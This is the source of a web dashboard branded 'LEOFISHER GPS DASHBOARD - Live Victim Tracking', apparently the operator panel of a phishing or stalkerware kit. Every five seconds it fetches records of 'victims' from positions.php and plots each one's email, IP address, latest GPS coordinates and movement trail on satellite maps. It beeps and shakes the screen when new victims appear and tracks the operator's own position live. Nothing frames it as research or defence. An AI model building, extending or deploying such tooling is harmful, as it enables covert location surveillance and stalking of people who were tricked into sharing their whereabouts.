<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LEOFISHER GPS DASHBOARD - Live Victim Tracking</title>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace; 
            background: #000; 
            color: #00ff00; 
            overflow: hidden;
            height: 100vh !important;
        }
        #banner {
            position: fixed; top: 0; left: 0; right: 0; z-index: 1000;
            background: rgba(0,255,0,0.9); color: #000; padding: 5px 15px;
            font-weight: bold; font-size: 14px; backdrop-filter: blur(10px);
        }
        #map { 
            height: 100vh !important; width: 100vw !important; 
            position: absolute; top: 0; left: 0; z-index: 1;
            background: #000 !important;
        }
        #status {
            position: fixed; bottom: 10px; left: 10px; z-index: 1001;
            background: rgba(0,0,0,0.8); padding: 10px; border: 1px solid #00ff00;
            font-size: 12px; max-width: 300px;
        }
        #controls {
            position: fixed; bottom: 10px; right: 10px; z-index: 1001;
            background: rgba(0,0,0,0.9); padding: 10px; border: 1px solid #00ff00;
        }
        button {
            background: #00ff00; color: #000; border: none; padding: 8px 12px;
            margin: 2px; cursor: pointer; font-family: inherit; font-size: 11px;
            border-radius: 3px; transition: all 0.3s;
        }
        button:hover { background: #00cc00; transform: scale(1.05); }
        button.active { background: #ff0000; color: #fff; }
        #trackPanel {
            position: fixed; right: -400px; top: 80px; width: 380px; height: 60vh;
            background: rgba(0,0,0,0.95); border-left: 2px solid #00ff00;
            transition: right 0.3s; z-index: 1002; overflow-y: auto;
            padding: 15px; font-size: 11px;
        }
        #trackPanel.show { right: 0; }
        .victim-item {
            background: rgba(255,0,0,0.2); margin: 8px 0; padding: 10px;
            border: 1px solid #ff0000; border-radius: 5px; cursor: pointer;
            transition: all 0.3s;
        }
        .victim-item:hover { background: rgba(255,0,0,0.4); transform: translateX(5px); }
        .coords { color: #00ff00; font-family: monospace; }
        .alert-shake { animation: shake 0.5s; }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        .polyline { stroke: #ff0000 !important; weight: 4 !important; opacity: 0.8 !important; }
    </style>
</head>
<body>
    <div id="banner">
        ┌─[ LEOFISHER GPS DASHBOARD ]─ Live Tracking Active | <span id="victimCount">0</span> Victims | Status: <span id="statusText">Initializing...</span>
    </div>
    <div id="map"></div>
    <div id="status">
        <strong>📍 LIVE STATUS</strong><br>
        <span id="liveStatus">Connecting...</span><br>
        <span id="opPos">-</span>
    </div>
    <div id="controls">
        <button onclick="fitAll()">🌍 Fit All</button>
        <button onclick="toggleTracks()">📊 Tracks</button>
        <button id="trackBtn" onclick="toggleOP()">📱 OP GPS</button>
        <button onclick="clearAll()">🗑️ Clear</button>
    </div>
    <div id="trackPanel">
        <h3>🔴 VICTIM TRACKS</h3>
        <div id="victimList"></div>
    </div>

    <script>
        let map, markers = L.markerClusterGroup({ maxClusterRadius: 50 });
        let polylines = [];
        let opMarker, opWatchId;
        let victims = [];
        let status = 'error';
        let trackingVictim = null;
        let audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAo');

        // Init map with Esri HD satellite (failsafe OSM)
        function initMap() {
            map = L.map('map', { zoomControl: true, minZoom: 2, maxZoom: 22 }).setView([0, 0], 2);
            
            // Try Esri WorldImagery first (HD satellite)
            L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
                attribution: '© Esri', maxZoom: 22
            }).addTo(map);
            
            map.addLayer(markers);
            status = 'ready';
            updateStatus('🟢 Map loaded - Esri HD Satellite');
            startLiveTracking();
            initOPGPS();
        }

        // OP Mobile GPS (watchPosition for live slide)
        function initOPGPS() {
            if (!navigator.geolocation) return;
            opWatchId = navigator.geolocation.watchPosition(pos => {
                const { latitude: lat, longitude: lng } = pos.coords;
                document.getElementById('opPos').textContent = `OP: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
                
                if (opMarker) opMarker.setLatLng([lat, lng]);
                else {
                    opMarker = L.marker([lat, lng], {
                        icon: L.divIcon({ className: 'op-icon', html: '🟡 OP', iconSize: [30, 30] })
                    }).addTo(map);
                }
                map.panTo([lat, lng], { animate: true });
            }, err => {
                document.getElementById('opPos').textContent = 'OP GPS: Denied';
            }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 10000 });
        }

        function toggleOP() {
            if (opWatchId) {
                navigator.geolocation.clearWatch(opWatchId);
                opWatchId = null;
                document.getElementById('trackBtn').textContent = '📱 OP GPS';
                document.getElementById('opPos').textContent = 'OP GPS: Stopped';
                if (opMarker) map.removeLayer(opMarker);
            } else {
                initOPGPS();
                document.getElementById('trackBtn').textContent = '⏹️ Stop OP';
            }
        }

        // Live tracking 5s no-reload
        function startLiveTracking() {
            fetchVictims();
            setInterval(fetchVictims, 5000);
        }

        async function fetchVictims() {
            try {
                const res = await fetch('positions.php');
                const data = await res.json();
                
                if (data.length !== victims.length) {
                    // New victims detected
                    audio.play().catch(() => {});
                    document.body.classList.add('alert-shake');
                    setTimeout(() => document.body.classList.remove('alert-shake'), 500);
                }
                
                victims = data;
                document.getElementById('victimCount').textContent = data.length;
                updateStatus(`🔴 ${data.length} victims live | Last fetch: ${new Date().toLocaleTimeString()}`);
                
                renderVictims(data);
                if (trackingVictim) trackVictim(trackingVictim);
                else fitAll();
                
                status = 'live';
            } catch (e) {
                updateStatus('❌ Fetch error: ' + e.message);
                status = 'error';
            }
        }

        function renderVictims(data) {
            markers.clearLayers();
            polylines.forEach(p => map.removeLayer(p));
            polylines = [];

            data.forEach((v, i) => {
                // Latest position marker
                const latest = v.latest;
                const marker = L.marker([latest.lat, latest.lng], {
                    icon: L.divIcon({
                        className: 'victim-icon',
                        html: `<div style="background:red;color:white;padding:2px 6px;border-radius:50%;font-size:12px;font-weight:bold;">${i+1}</div>`
                    })
                }).addTo(markers);
                
                marker.bindPopup(`
                    <b>🔴 Victim #${i+1}</b><br>
                    📧 ${v.email}<br>
                    🌐 ${v.ip}<br>
                    📍 ${latest.lat.toFixed(6)}, ${latest.lng.toFixed(6)}<br>
                    ⏰ ${latest.time}<br>
                    📊 ${v.count} positions
                `);

                // Trajectory polyline (10 positions)
                if (v.positions.length > 1) {
                    const poly = L.polyline(v.positions.map(p => [p.lat, p.lng]), {
                        color: '#ff0000', weight: 4, opacity: 0.8, className: 'polyline'
                    }).addTo(map);
                    polylines.push(poly);
                }
            });
            
            markers.addTo(map);
        }

        function trackVictim(victimId) {
            const victim = victims.find(v => v.id === victimId);
            if (!victim) return;
            
            trackingVictim = victimId;
            map.fitBounds([
                [victim.latest.lat - 0.01, victim.latest.lng - 0.01],
                [victim.latest.lat + 0.01, victim.latest.lng + 0.01]
            ]);
        }

        function fitAll() { 
            if (victims.length === 0) map.setView([0, 0], 2);
            else {
                const bounds = L.latLngBounds(victims.map(v => [v.latest.lat, v.latest.lng]));
                map.fitBounds(bounds, { padding: [20, 20] });
            }
        }

        function toggleTracks() {
            const btn = event.target;
            const show = !btn.classList.contains('active');
            polylines.forEach(p => p.setStyle({ opacity: show ? 0.8 : 0 }));
            btn.classList.toggle('active');
            btn.textContent = show ? '📊 Hide Tracks' : '📊 Tracks';
        }

        function clearAll() {
            victims = [];
            markers.clearLayers();
            polylines.forEach(p => map.removeLayer(p));
            polylines = [];
            updateStatus('🗑️ Cleared');
        }

        function updateStatus(text) {
            document.getElementById('statusText').textContent = text;
            document.getElementById('liveStatus').textContent = `Status: ${status.toUpperCase()}`;
        }

        // Track panel update
        function updateTrackPanel() {
            const list = document.getElementById('victimList');
            list.innerHTML = victims.map(v => `
                <div class="victim-item" onclick="trackVictim(${v.id})">
                    <strong>#${v.id} ${v.email.substring(0,20)}...</strong><br>
                    <span class="coords">${v.latest.lat.toFixed(6)}, ${v.latest.lng.toFixed(6)}</span><br>
                    ${v.count} positions | IP: ${v.ip}
                </div>
            `).join('');
        }

        // Haversine distance helper
        function haversine(lat1, lon1, lat2, lon2) {
            const R = 6371;
            const dLat = (lat2 - lat1) * Math.PI / 180;
            const dLon = (lon2 - lon1) * Math.PI / 180;
            const a = Math.sin(dLat/2) * Math.sin(dLat/2) + Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLon/2) * Math.sin(dLon/2);
            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
            return R * c;
        }

        // Init on load
        window.addEventListener('load', () => {
            setTimeout(initMap, 100);
            setInterval(updateTrackPanel, 1000);
        });

        // Debug console
        console.log('LEOFISHER GPS DASHBOARD v1.0 - Live tracking initialized');
        console.log('- Map: Esri HD Satellite + OSM fallback');
        console.log('- Status check F12: should show "LEOFISHER..." no errors');
        console.log('- Victims from positions.php -> markers/polylines/clustering');
        console.log('- OP GPS: watchPosition high accuracy');
        console.log('- Alerts: beep/shake/popup on new victims');
    </script>
</body>
</html>
